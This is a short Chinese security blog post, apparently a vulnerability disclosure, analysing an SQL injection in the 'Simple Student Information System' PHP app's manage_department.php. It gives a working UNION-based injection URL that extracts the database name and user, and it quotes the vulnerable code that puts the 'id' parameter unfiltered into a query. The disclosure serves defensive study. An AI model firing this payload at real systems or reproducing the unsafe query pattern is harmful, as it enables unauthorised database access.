=== Content from bewhale.github.io_0f603300_20250114_214615.html ===

[![头像](/images/avatar.png)
bewhale's blog](/)

[首页](/)

[归档](/archives)

[标签](/tags)

[在线工具](/post/tools)

[关于](/post/about)

## PHP代码审计—Simple Student Information System manage\_department.php SQL Injection

· 2022-08-07 ·

[# PHP代码审计](https://bewhale.github.io/tag/zuB-zqMRV/)
[# SourceCodester](https://bewhale.github.io/tag/B1lqNzXXY3/)
[# SQL Injection](https://bewhale.github.io/tag/Fd7HN4_Qg/)
[# SQL注入](https://bewhale.github.io/tag/I1jahqSnEI/)

# Vendor Homepage:

https://www.sourcecodester.com

# Source Code Download：

[Simple Student Information System](https://www.sourcecodester.com/php/15147/simple-student-information-system-phpoop-free-source-code.html)

# Payload

Simple Student Information System SQL Injection

```
http://192.168.1.8/sis/admin/departments/manage_department.php?id=-5756%27%20UNION%20ALL%20SELECT%20NULL,database(),user(),NULL,NULL,NULL,NULL--%20-

```
![image-20220807005100829](https://raw.githubusercontent.com/bewhale/img/master/post/202208070051905.png)
# 源码分析

`admin/departments/manage_department.php` 文件第1-13行，

根据代码可知，使用GET方法，获取了 `id` 参数，

并且未进行过滤直接拼接到SQL语句，造成SQL 注入漏洞

```
<?php
require_once('../../config.php');
if(isset($_GET['id'])){
    $qry = $conn->query("SELECT * FROM `department_list` where id = '{$_GET['id']}'");
    if($qry->num_rows > 0){
        $res = $qry->fetch_array();
        foreach($res as $k => $v){
            if(!is_numeric($k))
            $$k = $v;
        }
    }
}
?>

```

Powered by [bewhale](https://github.com/bewhale)


